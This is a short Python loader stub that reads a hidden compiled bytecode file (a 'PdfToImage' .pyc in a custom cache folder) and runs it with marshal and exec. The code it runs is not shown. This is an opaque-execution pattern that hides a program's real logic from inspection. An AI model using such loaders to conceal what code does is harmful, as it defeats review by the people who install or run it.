
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'PdfToImage_679b8065f8ce438da3c199f8d664fc01.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
